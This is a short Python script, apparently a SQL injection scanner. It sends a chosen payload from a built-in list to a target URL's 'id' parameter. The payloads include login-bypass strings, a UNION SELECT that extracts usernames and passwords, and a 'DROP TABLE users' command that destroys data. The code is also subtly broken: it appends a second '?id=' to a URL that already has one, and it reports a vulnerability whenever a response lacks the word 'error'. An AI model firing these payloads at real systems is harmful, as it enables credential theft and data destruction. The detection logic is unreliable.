import requests

class SQLInjectionScanner:
    def __init__(self, url):
        self.url = url
        self.payloads = [
            "' OR '1'='1';--",
            "' OR '1'='1' /*",
            "' AND 1=2 UNION SELECT NULL, username, password FROM users --",
            "' OR '1'='1' AND '1'='1",
            "'; DROP TABLE users; --",
            "' AND 1=1;--",
            "' OR 1=1;--",
            "' UNION SELECT NULL, database(), version(); --"
        ]

    def check_vulnerability(self):
        print("Available SQL Injection Payloads:")
        for i, payload in enumerate(self.payloads):
            print(f"{i + 1}: {payload}")

        choice = int(input("Select a payload to test (1-{}): ".format(len(self.payloads))))
        payload = self.payloads[choice - 1]

        response = requests.get(f"{self.url}?id={payload}")
        if response.status_code == 200:
            if "error" not in response.text.lower():  # Check for SQL error in response
                print(f"Possible SQL injection vulnerability found with payload: {payload}")
                return True
        print("No SQL injection vulnerabilities found.")
        return False


if __name__ == "__main__":
    target_url = "http://example.com/product?id=1"  # Replace with your target URL
    scanner = SQLInjectionScanner(target_url)
    scanner.check_vulnerability()
